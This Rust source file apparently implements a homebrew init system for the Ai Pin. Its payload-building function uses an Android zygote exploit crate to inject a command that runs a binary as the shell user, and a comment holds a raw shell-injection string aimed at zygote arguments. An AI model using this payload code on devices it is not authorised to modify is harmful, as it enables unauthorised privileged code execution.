#[macro_use]
extern crate log;
extern crate android_logger;

use std::path::PathBuf;

use android_31317_exploit::exploit::{ExploitKind, payload};
use android_logger::Config;
use clap::Parser;
use controller::Controller;
use error::Error;
use log::LevelFilter;
use zygote::extract_and_write_fd;

mod controller;
mod error;
mod registry;
mod socket;
mod state;
mod types;
mod unit;
mod zygote;

/// Custom init system for Ai Pin
#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
enum Args {
    /// Specializes this process as the controller, pid 2000 (shell), process
    Controller(NoAdditionalArgs),
    /// Create custom exploit payload. NOTE: This is for internal use; rely on the pinitd for launching other processes
    BuildPayload(NoAdditionalArgs),
}

#[derive(Parser, Debug)]
struct NoAdditionalArgs {
    #[arg(trailing_var_arg = true, allow_hyphen_values = true)]
    _remaining_args: Vec<String>,
}

#[tokio::main]
async fn main() {
    // Purposefully don't initialize logging until we need it, so we can specialize it for the process in question
    match run().await {
        Err(e) => {
            init_logging_with_tag(None);
            error!("{e}")
        }
        _ => (),
    }
}

async fn run() -> Result<(), Error> {
    log_panics::init();

    if let Err(error) = extract_and_write_fd() {
        error!("fd error: {error}");
    }

    match Args::try_parse()? {
        Args::Controller(_) => {
            // Spawn the worker and enter work loop
            init_logging_with_tag(Some("pinitd-controller".into()));
            warn!("Starting controller");
            // This uses the priviledged binary, not our binary
            Ok(Controller::create().await?)
        }
        Args::BuildPayload(_) => {
            init_logging_with_tag(None);
            warn!("Building init payload only");
            let payload = init_payload("/data/local/tmp/pinitd".into())?;
            // Write to stdout
            print!("{payload}");
            Ok(())
        }
    }
}

fn init_logging_with_tag(tag: Option<String>) {
    let config = Config::default();

    let config = if let Some(tag) = tag {
        config.with_tag(tag)
    } else {
        config
    };

    android_logger::init_once(config.with_max_level(LevelFilter::Trace));
}

fn init_payload(executable: PathBuf) -> Result<String, Error> {
    Ok(payload(
        2000,
        "/data/local/tmp/",
        "com.android.shell",
        "platform:shell:targetSdkVersion=29:complete",
        // Wrap command in sh to ensure proper permissions
        &ExploitKind::Command(format!(
            // Specifically use single quotes to preserve arguments
            // "'i=0;f=0;for a in \"\$@\";do i=\$((i+1));if [ \"\$a\" = com.android.internal.os.WrapperInit ];then eval f=\\\${\$((i+1))};break;fi;done; exec /system/bin/sh -c \"/data/local/tmp/pinitd controller & p=\\\$!; echo \\\$p >/proc/self/fd/\\\$1\" sh \"\$f\"'"
            "{} controller",
            // "/data/local/tmp/zygote_pid_writer",
            // "/system/bin/sh -c 'nohup {} controller $0 &'",
            executable.display()
        )),
        Some("com.android.shell"),
    )?)
}
